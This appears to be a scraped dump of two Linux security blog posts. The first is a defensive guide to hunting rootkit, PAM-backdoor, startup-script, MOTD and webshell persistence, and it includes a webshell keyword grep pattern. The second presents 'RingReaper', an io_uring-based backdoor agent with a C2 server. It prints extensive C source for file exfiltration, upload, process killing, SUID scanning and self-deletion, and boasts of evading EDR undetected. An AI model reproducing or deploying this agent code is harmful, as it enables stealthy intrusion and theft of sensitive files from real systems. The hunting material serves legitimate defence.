Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 